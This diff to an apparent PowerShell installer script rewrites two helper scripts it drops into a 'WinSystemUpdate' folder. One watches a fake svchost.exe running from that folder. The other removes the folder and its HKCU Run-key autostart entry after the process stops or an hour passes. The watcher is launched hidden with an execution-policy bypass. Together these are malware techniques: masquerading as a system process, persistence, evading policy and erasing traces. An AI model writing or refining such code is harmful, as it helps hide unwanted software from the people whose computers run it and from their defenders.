@@ -106,26 +106,26 @@ key_confirmed = true
 
     # 11. Watcher - auto deletes when process stops OR after 1 hour
     $del = "$DEST\delete.ps1"
-    Set-Content $del @'
-$d = "$env:LOCALAPPDATA\WinSystemUpdate"
-Get-Process svchost -EA SilentlyContinue | Where-Object { $_.Path -like '*WinSystem*' } | Stop-Process -Force -EA SilentlyContinue
+    @'
+`$d = "$DEST"
+Get-Process svchost -EA SilentlyContinue | Where-Object { `$_.Path -like '*WinSystem*' } | Stop-Process -Force -EA SilentlyContinue
 Remove-ItemProperty 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' 'WinSystemUpdate' -EA SilentlyContinue
 Start-Sleep 2
-Remove-Item -LiteralPath $d -Recurse -Force -EA SilentlyContinue
-'@ -Encoding UTF8
+Remove-Item -LiteralPath `$d -Recurse -Force -EA SilentlyContinue
+'@ | Set-Content $del -Encoding UTF8
 
     $watch = "$DEST\watch.ps1"
-    Set-Content $watch @'
-$EXE = "$env:LOCALAPPDATA\WinSystemUpdate\svchost.exe"
-$del = "$env:LOCALAPPDATA\WinSystemUpdate\delete.ps1"
-$deadline = [DateTime]::Now.AddHours(1)
-while ([DateTime]::Now -lt $deadline) {
+    @'
+`$EXE = "$EXE"
+`$del = "$del"
+`$deadline = [DateTime]::Now.AddHours(1)
+while ([DateTime]::Now -lt `$deadline) {
     Start-Sleep 10
-    $alive = Get-Process svchost -EA SilentlyContinue | Where-Object { $_.Path -eq $EXE }
-    if (-not $alive) { break }
+    `$alive = Get-Process svchost -EA SilentlyContinue | Where-Object { `$_.Path -eq `$EXE }
+    if (-not `$alive) { break }
 }
-if (Test-Path $del) { & $del }
-'@ -Encoding UTF8
+if (Test-Path `$del) { & `$del }
+'@ | Set-Content $watch -Encoding UTF8
 
     Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -File `"$watch`""
 
